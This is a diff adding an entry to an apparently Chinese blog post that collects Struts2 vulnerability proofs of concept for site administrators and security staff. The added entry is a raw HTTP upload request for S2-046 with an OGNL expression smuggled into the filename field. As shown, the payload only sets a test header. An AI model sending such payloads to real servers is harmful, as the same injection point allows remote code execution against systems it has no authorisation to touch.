@@ -11,6 +11,23 @@ categories: web安全
 <!--more -->
 　　Struts2框架漏洞不断，鉴于struts2使用之广泛，本文汇总Struts2系列漏洞的Poc，给网络管理员或者站长提供查询便利，以便更好的检测自身网站存在的漏洞，也可以让安全从业者更好的了解此漏洞。
 
+
+struts2-046（2017.3）
+```bash
+POST /doUpload.action HTTP/1.1
+Host: localhost:8080
+Content-Length: 10000000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
+Connection: close
+ 
+------WebKitFormBoundaryAnmUgTEhFhOZpr9z
+Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
+Content-Type: text/plain
+Kaboom 
+ 
+------WebKitFormBoundaryAnmUgTEhFhOZpr9z--
+```
+
 struts2-045（2017.3）
 (Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10)
 ```bash
